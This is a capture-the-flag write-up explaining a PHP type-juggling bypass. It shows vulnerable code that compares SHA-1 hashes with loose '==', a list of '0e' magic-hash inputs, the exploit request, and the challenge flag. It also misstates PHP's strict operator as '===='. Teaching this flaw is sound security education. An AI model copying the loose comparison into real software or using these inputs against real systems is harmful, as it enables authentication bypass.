# Warm Up

Author: [roerohan](https://github.com/roerohan)

## Description

This is a PHP Type Juggling Vulnerability.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Php

## Sources

```
If you know, you know; otherwise you might waste a lot of time.
```

## Exploit

In this challenge, you can see the `index.php` code by default.

```php
<?php

if (isset($_GET['hash'])) {
    if ($_GET['hash'] === "10932435112") {
        die('Not so easy mate.');
    }

    $hash = sha1($_GET['hash']);
    $target = sha1(10932435112);
    if($hash == $target) {
        include('flag.php');
        print $flag;
    } else {
        print "csictf{loser}";
    }
} else {
    show_source(__FILE__);
}
?>
```
<br />

So, you see that we have to match the value of `hash` and `target`. It is checked that the `hash` param does not equal `10932435112`, but again it checks that the sha1 hash of `hash` is equal to that of `10932435112`. We know that the sha1 hashes will not match ever, so it's not a bruteforce challenge. Later, you notice that the `$hash` and the `$target` and matched using `==` and not `====`. `==` is vulnerable to type juggling!
<br />

If you see the hash of `10932435112`, it starts with `0e...`. So any other hash which starts with `0e` will match this with `==`, since `==` does not check types, so these will be treated as numbers. So, you have to bruteforce considerably lesser amount of values. You would find a lot of matches:

```
aaroZmOk
aaK1STfY
aaO8zKZF
...
```

Pass any of these with the GET param `hash`, and you get the flag.

```
/?hash=aaroZmOk
```

The flag is:

```
csictf{typ3_juggl1ng_1n_php}
```